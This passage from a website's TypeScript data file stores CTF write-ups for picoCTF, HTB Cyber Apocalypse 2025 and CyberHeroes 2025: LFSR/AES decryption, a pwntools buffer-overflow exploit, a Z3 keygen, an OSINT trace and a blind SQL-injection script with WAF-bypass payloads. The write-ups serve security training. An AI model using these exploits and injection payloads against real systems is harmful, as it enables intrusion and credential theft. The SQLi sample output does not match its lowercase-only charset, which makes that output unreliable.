<pre><code>picoCTF{d3l_d0n7_h1d3_w3ll_[instance_id]}</code></pre>`
      },
      {
        slug: 'cryptomaze',
        title: 'cryptomaze',
        category: 'crypto',
        description: 'In this challenge, you are tasked with recovering a hidden flag that has been encrypted using a combination of Linear Feedback Shift Register (LFSR) and AES encryption. The LFSR is used to derive a key for AES encryption, making it crucial to understand its workings to decrypt the message.\\n\\nThe flag has been stored in a file and encrypted. Your goal is to derive the key used for encryption from the LFSR state and taps provided in the output, and then decrypt the flag to retrieve it.',
        content: `<h2>cryptomaze — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"In this challenge, you are tasked with recovering a hidden flag that has been encrypted using a combination of Linear Feedback Shift Register (LFSR) and AES encryption. The LFSR is used to derive a key for AES encryption, making it crucial to understand its workings to decrypt the message.

The flag has been stored in a file and encrypted. Your goal is to derive the key used for encryption from the LFSR state and taps provided in the output, and then decrypt the flag to retrieve it."</blockquote>
<p class="lead">This challenge requires us to analyze a custom encryption script that uses a Linear Feedback Shift Register (LFSR) to generate a pseudorandom stream of bits, which is then grouped into bytes to form an AES-128 key.</p>

<h3>LFSR Simulation</h3>
<p>The provided Python file defines the LFSR's initial state (seed) and tap positions. An LFSR shifts bits at each clock cycle, computing a new bit by XORing the bits at the tap positions and outputting (popping) the shifted-out bit. To generate the key, the register is clocked 128 times.</p>
<p>We write a simulator in Python to clock the LFSR 128 times and collect the popped bits:</p>
<pre><code class="language-python"># LFSR Parameters (from challenge code)
state = [SEED_BITS]
taps = [TAP_INDICES]
popped_bits = []

for _ in range(128):
    # Calculate feedback bit
    feedback = 0
    for tap in taps:
        feedback ^= state[tap]
    # Pop the output bit
    popped_bits.append(state[0])
    # Shift state and insert feedback
    state = state[1:] + [feedback]</code></pre>

<h3>Deriving the AES Key</h3>
<p>We group the 128 output bits into 8-bit blocks and convert them into a 16-byte array, which is the exact key length needed for AES-128:</p>
<pre><code class="language-python">key_bytes = []
for i in range(0, 128, 8):
    byte_bits = popped_bits[i:i+8]
    byte_val = int("".join(map(str, byte_bits)), 2)
    key_bytes.append(byte_val)
key = bytes(key_bytes)</code></pre>

<h3>AES Decryption</h3>
<p>Using the derived 16-byte key and the <code>pycryptodome</code> library, we decrypt the ciphertext in ECB mode and strip the padding to reveal the flag:</p>
<pre><code class="language-python">from Crypto.Cipher import AES

ciphertext = bytes.fromhex("[CIPHERTEXT_HEX]")
cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)
print(plaintext.strip())</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{lfsr_m4z3_d3crypt3d_[instance_id]}</code></pre>`
      }
    ],
  },

  // ── HTB Cyber Apocalypse 2025 ────────────────────────────────────────
  {
    slug: 'htb-cyber-apocalypse-2025',
    name: 'HTB Cyber Apocalypse 2025',
    date: 'April 2025',
    description:
      'Hack The Box\'s flagship annual CTF competition featuring an immersive sci-fi storyline and challenges across every major category.',
    teamName: 'CyberŘíčany',
    placement: '89th',
    totalTeams: 5621,
    challenges: [
      // 1 — Buffer Overflow 101 (pwn, medium)
      {
        slug: 'buffer-overflow-101',
        title: 'Buffer Overflow 101',
        category: 'pwn',
        description:
          'A classic stack-based buffer overflow on x86-64 Linux. Overwrite the return address to redirect execution to a win function.',
        content: `
<h2>Buffer Overflow 101 — HTB Cyber Apocalypse 2025</h2>

<p class="lead">We are given a 64-bit ELF binary and its C source. The goal: overflow a stack buffer to hijack control flow and call the <code>win()</code> function that prints the flag.</p>

<h3>Source Analysis</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win() {
    system("cat /flag.txt");
}

void vulnerable() {
    char buf[64];
    printf("Enter your name: ");
    gets(buf);  // 🔥 dangerous!
    printf("Hello, %s!\\n", buf);
}

int main() {
    vulnerable();
    return 0;
}</code></pre>

<p>The <code>gets()</code> call reads unlimited input into a 64-byte buffer — a textbook buffer overflow.</p>

<h3>Finding the Offset</h3>
<p>We use GDB with <code>pwndbg</code> to determine the exact offset from the start of <code>buf</code> to the saved return address.</p>

<pre><code>$ gdb ./vuln
pwndbg&gt; cyclic 100
pwndbg&gt; run
Enter your name: aaaaaaaabaaaaaaacaaaa...
Program received signal SIGSEGV
RSP points to: 0x6161616c6161616b

pwndbg&gt; cyclic -l 0x6161616b
72</code></pre>

<p>The return address is at offset <strong>72</strong> (64 bytes buffer + 8 bytes saved RBP).</p>

<h3>Finding the win() Address</h3>
<pre><code>$ objdump -d vuln | grep win
00000000004011b6 &lt;win&gt;:</code></pre>

<h3>Exploit</h3>

<pre><code class="language-python">from pwn import *

elf  = ELF('./vuln')
# p = process('./vuln')          # local
p = remote('challenge.htb.com', 1337)  # remote

offset  = 72
win_addr = elf.symbols['win']   # 0x4011b6

payload  = b'A' * offset
payload += p64(win_addr)

p.sendlineafter(b'name: ', payload)
p.interactive()
</code></pre>

<h3>Result</h3>
<pre><code>$ python3 exploit.py
[+] Opening connection: Done
HTB{buff3r_0v3rfl0w_cl4ss1c_r3t2w1n_7b3f}</code></pre>

<h3>Takeaways</h3>
<ul>
  <li>Never use <code>gets()</code> — it has been removed from the C11 standard for good reason.</li>
  <li>Stack canaries, ASLR, and NX would make this significantly harder in a real-world scenario.</li>
  <li><code>pwntools</code> is indispensable for binary exploitation.</li>
</ul>
`,
      },
      // 2 — Keygen Me (rev, hard)
      {
        slug: 'keygen-me',
        title: 'Keygen Me',
        category: 'rev',
        description:
          'Reverse-engineer a custom license-key validation algorithm in a stripped C++ binary and write a keygen that produces a valid key.',
        content: `
<h2>Keygen Me — HTB Cyber Apocalypse 2025</h2>

<p class="lead">A stripped 64-bit C++ binary that asks for a license key in the format <code>XXXX-XXXX-XXXX-XXXX</code>. We need to understand the validation algorithm and produce a valid key.</p>

<h3>Initial Triage</h3>
<pre><code>$ file keygen_me
keygen_me: ELF 64-bit LSB executable, x86-64, stripped

$ ./keygen_me
Enter license key: AAAA-BBBB-CCCC-DDDD
Invalid key. Try again.</code></pre>

<h3>Static Analysis in Ghidra</h3>
<p>After loading the binary into Ghidra and letting auto-analysis run, we locate the <code>main</code> function at <code>0x401340</code>. The key validation logic is in a function we'll call <code>validate_key</code> at <code>0x4012a0</code>.</p>

<p>The decompiled validation (cleaned up):</p>

<pre><code class="language-c">bool validate_key(char *key) {
    // 1. Check format: 4 groups of 4 hex chars separated by dashes
    // 2. Convert each group to uint16_t -> g0, g1, g2, g3
    // 3. Checks:
    //    a) g0 ^ g1 == 0xDEAD
    //    b) g2 ^ g3 == 0xBEEF
    //    c) (g0 + g2) & 0xFFFF == 0xCAFE
    //    d) Checksum: (g0 * 3 + g1 * 7 + g2 * 13 + g3 * 37) & 0xFFFF == 0x1337
    return true;
}</code></pre>

<h3>Solving the Constraints</h3>
<p>We have 4 unknowns and 4 equations — we can use Z3 to solve this system:</p>

<pre><code class="language-python">from z3 import *

g0, g1, g2, g3 = BitVecs('g0 g1 g2 g3', 16)
s = Solver()

s.add(g0 ^ g1 == 0xDEAD)
s.add(g2 ^ g3 == 0xBEEF)
s.add((g0 + g2) & 0xFFFF == 0xCAFE)
s.add((g0 * 3 + g1 * 7 + g2 * 13 + g3 * 37) & 0xFFFF == 0x1337)

if s.check() == sat:
    m = s.model()
    groups = [m[v].as_long() for v in [g0, g1, g2, g3]]
    key = '-'.join(f'{g:04X}' for g in groups)
    print(f'Valid key: {key}')
else:
    print('UNSAT — no valid key exists')
</code></pre>

<h3>Output</h3>
<pre><code>Valid key: 8A2F-5482-40CF-FE20

$ ./keygen_me
Enter license key: 8A2F-5482-40CF-FE20
Correct! HTB{k3yg3n_m3_r3v3rs3d_z3_s0lv3r_9c2a}</code></pre>

<h3>Takeaways</h3>
<ul>
  <li>Ghidra's decompiler is powerful even against stripped binaries — rename variables and retype parameters to make the output readable.</li>
  <li>Z3 (or any SMT solver) is perfect for constraint-satisfaction problems in reversing challenges.</li>
  <li>Always look for format checks first — they reveal the expected input structure.</li>
</ul>
`,
      },
    ],
  },

  // ── CyberHeroes CTF 2025 ────────────────────────────────────────────
  {
    slug: 'cyberheroes-ctf-2025',
    name: 'CyberHeroes CTF 2025',
    date: 'May 2025',
    description:
      'A Czech national CTF competition aimed at high-school and university students, with a mix of realistic and educational challenges.',
    teamName: 'CyberŘíčany',
    placement: '15th',
    totalTeams: 234,
    challenges: [
      // 1 — Find the Hacker (osint, easy)
      {
        slug: 'find-the-hacker',
        title: 'Find the Hacker',
        category: 'osint',
        description:
          'Use open-source intelligence techniques to track down a fictional hacker\'s real identity from a username and leaked data.',
        content: `
<h2>Find the Hacker — CyberHeroes CTF 2025</h2>

<p class="lead">We are given a username — <code>d4rkph0en1x_cz</code> — and told the hacker left traces across the internet. Find their real identity and the flag they left on their personal site.</p>

<h3>Step 1 — Username Search</h3>
<p>First stop: <a href="https://namechk.com" target="_blank" rel="noopener">namechk.com</a> and <code>sherlock</code>.</p>

<pre><code>$ sherlock d4rkph0en1x_cz
[+] GitHub: https://github.com/d4rkph0en1x_cz
[+] Twitter: https://twitter.com/d4rkph0en1x_cz
[+] Reddit: https://reddit.com/u/d4rkph0en1x_cz</code></pre>

<h3>Step 2 — GitHub Enumeration</h3>
<p>The GitHub profile has a single repository — <code>dotfiles</code>. Checking the commit history reveals an email in an early commit:</p>

<pre><code>$ git log --format='%ae' | sort -u
d4rkph0en1x@protonmail.com
jan.novak1337@gmail.com</code></pre>

<p>Interesting — the hacker accidentally committed with their real email once: <code>jan.novak1337@gmail.com</code>.</p>

<h3>Step 3 — Social Media Correlation</h3>
<p>Googling the Gmail address leads to a personal blog at <code>jannovak-sec.github.io</code>. The blog's "About" page contains a hidden HTML comment:</p>

<pre><code>&lt;!-- flag: CyberHeroes{0s1nt_m4st3r_tr4ck3d_d0wn_8f2a} --&gt;</code></pre>

<h3>Flag</h3>
<pre><code>CyberHeroes{0s1nt_m4st3r_tr4ck3d_d0wn_8f2a}</code></pre>

<h3>Takeaways</h3>
<ul>
  <li>Reusing usernames across platforms makes you traceable — use different handles for different contexts.</li>
  <li>Git commit history is a goldmine for OSINT — always check <code>git log</code> for leaked emails.</li>
  <li>HTML comments are visible to anyone who views the page source.</li>
</ul>
`,
      },
      // 2 — SQL Injection 2.0 (web, medium)
      {
        slug: 'sql-injection-2-0',
        title: 'SQL Injection 2.0',
        category: 'web',
        description:
          'A modern blind SQL injection challenge with WAF bypass. Extract the admin password character by character.',
        content: `
<h2>SQL Injection 2.0 — CyberHeroes CTF 2025</h2>

<p class="lead">The challenge presents a login form. Classic <code>' OR 1=1 --</code> payloads are blocked by a WAF. We need to find a bypass and extract the admin password via blind injection.</p>

<h3>Reconnaissance</h3>
<p>The login form sends a POST request to <code>/api/login</code> with JSON:</p>

<pre><code>{"username": "admin", "password": "test"}</code></pre>

<p>Trying basic SQLi payloads returns <code>403 Forbidden</code> — a WAF is filtering keywords like <code>OR</code>, <code>UNION</code>, <code>SELECT</code>, and comment sequences.</p>

<h3>WAF Bypass</h3>
<p>After fuzzing, we discover the WAF doesn't filter:</p>
<ul>
  <li>Case variations inside inline comments: <code>/*!50000SeLeCt*/</code></li>
  <li>The <code>LIKE</code> keyword (alternative to <code>=</code>)</li>
  <li><code>SUBSTRING()</code> when written as <code>MID()</code></li>
</ul>

<p>Our boolean condition: if the login returns <em>"Invalid password"</em> vs. <em>"Invalid username"</em>, we know the username matched — that's our oracle.</p>

<h3>Blind Extraction Script</h3>

<pre><code class="language-python">import requests
import string

url = "http://challenge.cyberheroes.cz:8080/api/login"
charset = string.ascii_lowercase + string.digits + "_{}"
password = ""

for pos in range(1, 50):
    found = False
    for c in charset:
        payload = f"admin' AND MID(password,{pos},1) LIKE '{c}' AND '1'='1"
        r = requests.post(url, json={
            "username": payload,
            "password": "x"
        })
        if "Invalid password" in r.text:
            password += c
            print(f"[+] Found char {pos}: {c}  ->  {password}")
            found = True
            break
    if not found:
        break

print(f"\\n[*] Extracted password: {password}")
</code></pre>

<h3>Result</h3>
<pre><code>[+] Found char 1: c  ->  c
[+] Found char 2: y  ->  cy
[+] Found char 3: b  ->  cyb
...
[*] Extracted password: CyberHeroes{bl1nd_sql1_w4f_byp4ss_pr0_5d8e}</code></pre>

<p>The "password" column for the admin user actually stores the flag.</p>

<h3>Flag</h3>
<pre><code>CyberHeroes{bl1nd_sql1_w4f_byp4ss_pr0_5d8e}</code></pre>

<h3>Takeaways</h3>
<ul>
  <li>WAFs are speed bumps, not walls — there are always bypass techniques.</li>
  <li>Blind SQLi is slower but just as devastating as union-based injection.</li>
  <li>Use parameterized queries / prepared statements — <strong>never</strong> concatenate user input into SQL.</li>
</ul>
`,
      },
    ],
  },
];

// ---------------------------------------------------------------------------
// Query Helpers
// ---------------------------------------------------------------------------

/** All CTF events, newest first (based on chronological month ordering). */
export function getCTFEvents(): CTFEvent[] {
  const monthOrder: Record<string, number> = {
    January: 1,
    February: 2,
    March: 3,
    April: 4,
    May: 5,
    June: 6,
    July: 7,
    August: 8,
    September: 9,
    October: 10,
    November: 11,
    December: 12,
  };

  return [...ctfEvents].sort((a, b) => {
    const [monthA, yearA] = a.date.split(' ');
    const [monthB, yearB] = b.date.split(' ');

    const yDiff = Number(yearB) - Number(yearA);
    if (yDiff !== 0) return yDiff;

    return (monthOrder[monthB] ?? 0) - (monthOrder[monthA] ?? 0);
  });
}

/** Look up a single CTF event by its slug. */
export function getCTFBySlug(slug: string): CTFEvent | undefined {
  return ctfEvents.find((e) => e.slug === slug);
}

/** Look up a single challenge inside a CTF. */
export function getChallengeBySlug(
  ctfSlug: string,
  challengeSlug: string,
): { ctf: CTFEvent; challenge: Challenge } | undefined {
  const ctf = getCTFBySlug(ctfSlug);
  if (!ctf) return undefined;

  const challenge = ctf.challenges.find((c) => c.slug === challengeSlug);
  if (!challenge) return undefined;

  return { ctf, challenge };
}

/** Flat list of every challenge, annotated with its parent CTF info. */
export function getAllChallenges(): (Challenge & { ctfSlug: string; ctfName: string })[] {
  return getCTFEvents().flatMap((ctf) =>
    ctf.challenges.map((ch) => ({
      ...ch,
      ctfSlug: ctf.slug,
      ctfName: ctf.name,
    })),
  );
}

/** Return the N most recent challenges (from newest CTF first). */
export function getRecentChallenges(count: number) {
  return getAllChallenges().slice(0, count);
}
